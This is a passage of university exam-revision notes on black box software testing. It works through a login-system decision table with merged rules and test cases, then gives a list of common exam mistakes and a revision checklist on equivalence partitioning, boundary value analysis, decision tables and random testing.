2. They differ in **exactly one** condition.

The differing condition is replaced with a **"don't care" (-) symbol**, meaning *either value* is acceptable for that condition.

**Cause-Effect Graphing (1 mark):** Cause-effect graphing is a systematic pre-processing step that converts a specification (in natural language) into a decision table by:
1. Identifying **causes** (input conditions) and **effects** (actions).
2. Drawing a graph with AND/OR/NOT logic nodes connecting them.
3. Converting the graph into a **decision table** by enumerating cause combinations.

**Part (b) — Login System Decision Table (7 marks)**

**Step 1: Identify Conditions and Actions (1 mark)**

| Conditions | Actions |
|---|---|
| $C_1$: Username Valid? | $A_1$: Login Successful |
| $C_2$: Password Valid? | $A_2$: Account Locked Error |
| $C_3$: Account Active? | $A_3$: Wrong Password Error |
| | $A_4$: User Not Found Error |

**Step 2: Full Decision Table (3 marks)**

|  | R1 | R2 | R3 | R4 | R5 | R6 | R7 | R8 |
|---|---|---|---|---|---|---|---|---|
| $C_1$ | T | T | T | T | F | F | F | F |
| $C_2$ | T | T | F | F | T | T | F | F |
| $C_3$ | T | F | T | F | T | F | T | F |
| $A_1$ | X | | | | | | | |
| $A_2$ | | X | | | | | | |
| $A_3$ | | | X | X | | | | |
| $A_4$ | | | | | X | X | X | X |

**Step 3: Apply Rule Merging (2 marks)**

- **R3, R4:** Same action $A_3$, differ in $C_3$ (T vs F) → **MERGE** → New R3: ($C_1$=T, $C_2$=F, $C_3$=-, $A_3$).
- **R5, R6, R7, R8:** All trigger $A_4$, can be progressively merged:

**Step 4: Reduced Decision Table (1 mark)**

|  | R1 | R2 | R3' | R4' |
|---|---|---|---|---|
| $C_1$ | T | T | T | F |
| $C_2$ | T | T | F | - |
| $C_3$ | T | F | - | - |
| $A_1$ | X | | | |
| $A_2$ | | X | | |
| $A_3$ | | | X | |
| $A_4$ | | | | X |

**Step 5: Test Cases (1 mark)**

- **TC1:** Valid user, valid password, active account → Login Successful.
- **TC2:** Valid user, valid password, locked account → Account Locked Error.
- **TC3:** Valid user, invalid password → Wrong Password Error.
- **TC4:** Invalid user → User Not Found Error.

**Minimum test cases: 4 (one per effective rule).**

---

> [!WARNING]
> **KTU Examiner's Valuation Warning — Where Students Lose Marks on This Topic:**
>
> 1. **Confusing Robust vs Worst-Case BVA:** Students frequently write **6** test cases for worst-case BVA when the question expects the **Cartesian product**. Always read carefully: *"worst-case"* means **multiply per-variable sets**; *"robust"* means **add per-variable sets**; *"normal"* means **just on-boundary**.
>
> 2. **Forgetting the "Off-by-One" in BVA:** ECP picks **one** representative per class. BVA picks the **boundary** representative. If the question says "Use BVA," picking a middle value (e.g., 50 out of [1,100]) **is wrong** — you must use $\{1, 2, 99, 100\}$.
>
> 3. **Mixing Valid and Invalid in ECP Tests:** A common error is to test $(0, 'A')$ where $0$ is invalid. The correct ECP approach is **one invalid input per test case** to isolate the rejection logic. Combining $(0, 'Z')$ in a single test would not tell you *which* input caused the rejection.
>
> 4. **Decision Table Merging Errors:** Students often merge rules that differ in **two or more** conditions. **Always check:** if two rules differ in 2+ conditions, they **cannot** be merged (even if actions are the same).
>
> 5. **Confusing ECP Partitions with Decision Table Rules:** These are *different* concepts. ECP partitions are *input classes*. Decision table rules are *combinations of conditions → actions*.
>
> 6. **Skipping the "ISP Assumption":** In 7-mark questions, students forget to *state* the underlying equivalence class hypothesis. This costs 1–2 marks.
>
> 7. **In Random Testing, Forgetting the Formula:** $P(\text{Detect in } n \text{ tests}) = 1 - (1 - p_f)^n$ is **high-yield**. Don't write the formula incorrectly as $1 - p_f^n$.

---

### 5.3 Topic Recap & Important Things to Remember (Rapid Revision Checklist)

> [!IMPORTANT]
> **High-Density Revision Notes for Last-Minute KTU Prep:**

**1. Black Box Testing Definition** — Testing based on **specifications, not code**. Tester is **end-user**, not developer.

**2. Input Space Partitioning (ISP)**
- Divides input domain $D$ into disjoint, exhaustive partitions $D_1 \ldots D_k$.
- Underlying assumption: All values in a partition are processed equivalently.
- **1 test per partition** is the golden rule.

**3. Domain Testing**
- Application of ISP to **numerical** (ordered) input domains.
- Focuses on **boundary** behavior.
- Bridges ISP theory with BVA practice.

**4. Equivalence Class Partitioning (ECP)**
- Partition each input condition into **valid** and **invalid** classes.
- **1 test per class.** Combine valid reps; isolate invalid reps.
- **Formulas:**
  - Total ECP tests = $\sum (\text{valid classes}) + \sum (\text{invalid classes, separately tested})$
  - Reduced: 1 test for all valid + 1 per invalid.

**5. Boundary Value Analysis (BVA) — The "Off-by-One" Specialist**
- **Normal BVA:** $\{a, a+1, b-1, b\}$ — 4 test points per range.
- **Robust BVA:** $\{a-1, a, a+1, b-1, b, b+1\}$ — 6 test points per range.
- **Worst-Case BVA:** Cartesian product of all BVA points — **MULTIPLY**, not add.
- Targets **boundary fault density** (highest error concentration at edges).

**6. Decision Table Testing**
- Best for **multi-condition combinatorial logic**.
- Number of rules = $\prod_{i=1}^{m} v_i$ (often $2^m$ for Boolean).
- **Merge rules** with same actions, differing in 1 condition (replace with `-`).
- Use **cause-effect graphing** to derive table from spec.

**7. Random Testing**
- $P(\text{Detect in n}) = 1 - (1 - p_f)^n$.
- $E[N_f] = 1/p_f$ (expected tests to detect fault).
- Variants: Uniform, **Adaptive (ART)**, Fuzz, Monkey, Profile-guided.
- **ART** uses furthest-first selection for better spatial diversity.

**8. Triangulation Principle** — Use **multiple** techniques together. ECP + BVA + Decision Tables + Random = comprehensive coverage.

**9. KTU Exam Pattern Memory Aids**
- For BVA count questions: **remember 4 (normal), 6 (robust), product (worst-case)**.
- For ECP count: **count partitions, not test case count directly**.
- For Decision Tables: **merge iteratively, never skip more than 1 condition**.

**10. Common Pitfalls** — Off-by-one in BVA, merging more than 1 condition, confusing robust vs worst-case, forgetting to state the ISP assumption in 7-mark answers.

---

> **End of Module 4 Notes — Black Box Testing**
